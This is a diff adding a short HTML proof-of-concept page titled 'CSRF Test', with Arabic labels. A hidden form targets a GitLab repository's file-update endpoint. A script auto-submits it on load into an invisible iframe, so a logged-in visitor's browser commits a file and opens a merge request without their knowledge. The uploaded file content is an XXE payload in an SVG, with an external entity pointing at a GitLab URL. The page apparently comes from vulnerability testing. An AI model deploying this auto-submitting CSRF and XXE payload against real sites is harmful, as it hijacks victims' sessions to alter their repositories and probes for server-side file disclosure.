@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Test</title>
+</head>
+<body>
+    <h1>اختبار CSRF</h1>
+    <form id="csrfForm" action="https://gitlab.com/pedo.pedo/kont/-/update/main/ttr.md.js.png.xml" method="POST" target="hidden-iframe"  >
+        <input type="hidden" name="_method" value="PUT" />
+        <input type="hidden" name="origin" value="https://gitlab.com" />
+        <input type="hidden" name="referer" value="https://gitlab.com" />
+        <input type="hidden" name="commit_message" value="Edit ttr.md.js.png.xml">
+        <input type="hidden" name="original_branch" value="main">
+        <input type="hidden" name="create_merge_request" value="1">
+        <input type="hidden" name="branch_selection" value="false">
+        <input type="hidden" name="file" value="<?xml version='1.0' standalone='yes'?><!DOCTYPE test [ <!ENTITY xxe SYSTEM 'https://gitlab.com/pedo.pedo/kont/-/blob/main/Date.png' > ]><svg width='128px' height='128px' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' version='1.1'><text font-size='16' x='0' y='16'>&xxe;</text></svg try22">
+        <input type="hidden" name="file_path" value="ttr.md.js.png.xml">
+        <input type="hidden" name="last_commit_sha" value="3eddf2486b430c0766a78524fcf9471b4693181b">
+        <input type="hidden" name="from_merge_request_iid" value="">
+        <button type="submit">أرسل الطلب</button>
+    </form>
+    <iframe
+    id="hidden-iframe"
+    name="hidden-iframe"
+    style="display: none"
+  ></iframe>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
